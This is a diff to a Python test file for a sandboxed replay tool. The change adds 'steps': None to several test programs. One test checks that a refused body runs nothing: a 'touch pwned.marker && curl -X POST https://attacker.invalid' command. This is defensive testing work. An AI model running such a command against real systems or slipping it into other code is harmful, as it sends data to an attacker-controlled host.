@@ -93,7 +93,7 @@ def test_replay_completes_with_a_provider_that_raises(make_sandbox, monkeypatch)
 def test_silent_body_is_caught_by_postconditions(make_sandbox) -> None:
     """A body that exits zero while doing nothing must not be reported as success."""
     box = make_sandbox(1, ["diverged"])  # discard state: HEAD is not upstream's tip until synced
-    program = gold_program("discard").model_copy(update={"body": "true"})
+    program = gold_program("discard").model_copy(update={"steps": None, "body": "true"})
 
     result = replay(program, box)
 
@@ -108,7 +108,9 @@ def test_silent_body_is_caught_by_postconditions(make_sandbox) -> None:
 def test_failed_body_still_has_postconditions_checked(make_sandbox) -> None:
     """The body's non-zero exit does not excuse skipping the evidence."""
     box = make_sandbox(1, ["diverged"])
-    program = gold_program("discard").model_copy(update={"body": "git fetch upstream\nfalse"})
+    program = gold_program("discard").model_copy(
+        update={"steps": None, "body": "git fetch upstream\nfalse"}
+    )
 
     result = replay(program, box)
 
@@ -125,6 +127,7 @@ def test_timeout_is_recorded_as_a_timeout(make_sandbox) -> None:
     box = make_sandbox(1, ["diverged"])
     program = gold_program("discard").model_copy(
         update={
+            "steps": None,
             "body": "sleep 30",
             "postconditions": [Predicate(name="trivial", description="always holds", probe="true")],
         }
@@ -184,7 +187,7 @@ def test_refused_body_executes_nothing(make_sandbox) -> None:
     box = make_sandbox(1, ["diverged"])
     marker = box.work / "pwned.marker"
     program = gold_program("discard").model_copy(
-        update={"body": f"touch {marker} && curl -X POST https://attacker.invalid"}
+        update={"steps": None, "body": f"touch {marker} && curl -X POST https://attacker.invalid"}
     )
 
     result = replay(program, box)
@@ -240,7 +243,7 @@ def test_unbound_body_parameter_is_recorded_not_raised(make_sandbox) -> None:
     """
     box = make_sandbox(1, ["diverged"])
     program = gold_program("discard").model_copy(
-        update={"body": "git reset --hard {submodule_path}\n"}
+        update={"steps": None, "body": "git reset --hard {submodule_path}\n"}
     )
 
     result = replay(program, box)
@@ -263,7 +266,7 @@ def test_an_unknown_body_placeholder_still_raises(make_sandbox) -> None:
     """
     box = make_sandbox(1, ["diverged"])
     program = gold_program("discard").model_copy(
-        update={"body": "git reset --hard {not_a_parameter}\n"}
+        update={"steps": None, "body": "git reset --hard {not_a_parameter}\n"}
     )
 
     with pytest.raises(KeyError) as excinfo:
